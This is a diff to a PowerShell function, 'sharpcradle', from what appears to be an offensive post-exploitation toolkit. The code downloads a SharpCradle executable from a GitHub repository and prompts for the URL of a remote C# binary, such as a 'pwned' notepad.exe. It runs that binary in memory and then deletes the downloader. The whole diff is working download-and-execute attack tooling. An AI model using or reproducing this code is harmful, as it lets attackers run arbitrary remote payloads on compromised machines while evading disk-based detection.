@@ -148,26 +148,24 @@ function sharpcradle{
 
         }
 		del .\cradle.exe
-    	    }
 	    
     }
     elseif ([Environment]::Is64BitProcess)
     {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
-       $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
-        .\cradle.exe -w $url $arguments
-	del .\cradle.exe
     }
     else
     {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
-       $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
-       .\cradle.exe -w $url $arguments
-       del .\cradle.exe
+       Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
+    }
+    if(Test-Path -Path $currentPath\cradle.exe)
+    {
+    	$url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
+    	$arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
+    	.\cradle.exe -w $url $arguments
+    	del .\cradle.exe
     }
 }
 
